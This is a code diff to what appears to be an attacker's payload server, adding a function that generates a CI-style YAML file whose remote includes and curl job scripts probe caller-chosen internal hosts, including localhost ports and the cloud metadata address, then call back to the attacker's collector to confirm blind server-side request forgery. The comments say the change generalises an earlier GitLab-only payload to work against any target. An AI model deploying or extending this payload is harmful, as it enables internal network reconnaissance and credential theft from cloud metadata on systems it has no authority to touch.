@@ -154,7 +154,7 @@ export function ssrfIncludeYaml(request: Request, baseUrl: string): Response {
   logEntry({ ...log, event: "payload:ssrf-include-remote" });
 
   // Resolve a scan target URL from query or default to cycle
-  const redirectTarget = getParam(request, "target") || `${baseUrl}/gitlab/scan.yml`;
+  const redirectTarget = getParam(request, "target") || `${baseUrl}/ssrf/sweep.yml`;
 
   const body = [
     "---",
@@ -318,4 +318,62 @@ export function xssPayload(request: Request): Response {
 
 function escapeHtml(s: string): string {
   return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+}
+
+/**
+ * Internal port sweep for SSRF that runs through a parser.
+ *
+ * The previous version cycled a hardcoded list of GitLab internal services,
+ * which only helped against one target. The hosts come from the caller now, so
+ * the same endpoint works anywhere, and each entry points back at the collector
+ * so a fetch that succeeds is visible even when the response never reaches the
+ * attacker.
+ *
+ *   /ssrf/sweep.yml?hosts=127.0.0.1:80,127.0.0.1:6379&token=<token>
+ */
+export function ssrfSweepYaml(request: Request, baseUrl: string): Response {
+  const url = new URL(request.url);
+  const log = baseLog(request);
+
+  const raw = getParam(request, "hosts") || "127.0.0.1:80,127.0.0.1:443,169.254.169.254:80";
+  const token = (getParam(request, "token") || "sweep").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 128);
+
+  // A cap keeps a stray parameter from generating a document that reads as a
+  // denial-of-service attempt against the target's own network.
+  const hosts = raw
+    .split(",")
+    .map((h) => h.trim())
+    .filter((h) => /^[A-Za-z0-9._:\[\]-]{1,64}$/.test(h))
+    .slice(0, 25);
+
+  logEntry({ ...log, event: "ssrf:sweep", count: hosts.length });
+
+  const lines = [
+    "---",
+    "# Generic SSRF sweep. Each entry is fetched by whatever parses this file.",
+    `# Callbacks land at ${baseUrl}/oob/${token}`,
+    "",
+    "include:",
+  ];
+  for (const host of hosts) {
+    lines.push(`  # ${host}`);
+    lines.push(`  - remote: "http://${host}/"`);
+  }
+  lines.push("");
+  lines.push("stages:");
+  lines.push("  - probe");
+  lines.push("");
+  for (const [i, host] of hosts.entries()) {
+    lines.push(`probe_${i}:`);
+    lines.push("  stage: probe");
+    lines.push("  script:");
+    lines.push(`    - curl -s -m 3 "http://${host}/" -o /dev/null`);
+    // The callback is what proves execution; the fetch above may be blind.
+    lines.push(`    - curl -s -m 3 "${baseUrl}/oob/${token}?host=${encodeURIComponent(host)}"`);
+    lines.push("");
+  }
+
+  return new Response(lines.join("\n"), {
+    headers: { "Content-Type": "text/yaml", "Cache-Control": "no-store" },
+  });
 }
